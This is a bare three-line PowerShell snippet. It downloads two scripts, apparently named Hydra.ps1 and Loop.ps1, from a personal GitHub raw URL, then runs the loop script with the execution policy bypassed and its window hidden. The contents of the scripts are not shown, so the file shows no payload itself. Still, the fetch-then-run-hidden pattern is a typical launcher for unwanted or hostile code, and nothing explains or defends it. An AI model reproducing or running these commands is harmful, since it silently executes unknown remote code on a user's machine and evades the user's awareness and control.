Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Hydra/Hydra.ps1 -OutFile .\Hydra.ps1
Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Hydra/Loop.ps1 -OutFile .\Loop.ps1
powershell -ExecutionPolicy Bypass -File Loop.ps1 -windowstyle hidden
